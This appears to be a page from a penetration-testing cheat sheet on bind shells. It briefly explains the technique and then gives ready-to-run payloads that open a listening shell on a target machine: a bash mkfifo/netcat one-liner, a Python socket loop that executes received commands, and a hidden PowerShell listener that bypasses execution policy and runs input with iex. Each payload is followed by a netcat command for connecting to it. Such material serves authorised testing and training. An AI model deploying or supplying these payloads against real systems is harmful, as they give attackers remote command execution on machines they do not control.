# Bind shell

A **Bind Shell** is a technique used to gain remote access to a victim's system by making it listen on a port and then connecting to that listener. The shell sent to listen is attached to the target's shell on the target system, letting us take control of the internal shell by connecting to it.

It is usually less effective than trying to get a [Reverse Shell](reverse-shell.md), as the hosts that use firewalls normally block incoming connections.

## <mark style="color:orange;">Basic script</mark>

* &#x20;Use a script that establishes a listening port on the target machine

{% code title="BindShell.sh" overflow="wrap" lineNumbers="true" %}
```bash
#!/bin/bash

rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp $port >/tmp/f
```
{% endcode %}

* Connect to the listening port we have set using [_Netcat_](../networks/tools-and-utilities.md#netcat)

{% code overflow="wrap" lineNumbers="true" %}
```bash
nc $IP $port
```
{% endcode %}

## <mark style="color:orange;">Using Python</mark>

* &#x20;Use this command to establish a listening port on the target machine with _Python_

{% code overflow="wrap" lineNumbers="true" %}
```bash
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",$port));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```
{% endcode %}

* Connect to the listening port we have set using _Netcat_

{% code overflow="wrap" lineNumbers="true" %}
```bash
nc $IP $port
```
{% endcode %}

## <mark style="color:orange;">Using PowerShell</mark>

* &#x20;Use this command to establish a listening port on a _Windows_ target machine using PowerShell

{% code overflow="wrap" lineNumbers="true" %}
```bash
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]$port; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```
{% endcode %}

* Connect to the listening port we have set using _Netcat_

{% code overflow="wrap" lineNumbers="true" %}
```bash
nc $IP $port
```
{% endcode %}
